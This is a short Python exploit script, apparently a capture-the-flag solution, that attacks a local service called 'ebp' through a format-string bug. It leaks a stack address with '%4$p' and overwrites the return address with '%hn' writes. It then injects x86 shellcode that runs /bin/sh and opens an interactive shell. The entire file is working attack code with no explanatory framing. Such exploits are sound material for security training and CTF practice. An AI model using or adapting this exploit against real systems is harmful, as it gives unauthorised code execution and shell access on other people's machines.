#!/usr/bin/python
#--by muhe--
from zio import *
#target='./ebp'
target = ('127.0.0.1',10001)
io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green'))
shellcode = ("\x6a\x0b\x58\x99\x52\x68\x2f\x2f"
             "\x73\x68\x68\x2f\x62\x69\x6e\x54"
             "\x5b\x52\x53\x54\x59\x0f\x34")
vuln_addr  =0x0804a480
#leak stack addr
io.writeline('%4$p')
#raw_input()
leak_addr = int(io.read_until('\n'),16)
ret_addr = (leak_addr-0x1c) & 0xffff
print ret_addr
#overwrite
#raw_input()
p1 = "%"+str(ret_addr)+"x%"+str(4)+"$hn"
io.writeline(p1)
io.read_until('\n')
#get shell
##raw_input()
p2 = shellcode+"%"+str((vuln_addr & 0xffff)-len(shellcode))+"x%"+str(12)+"$hn"
io.writeline(p2)
io.interact()
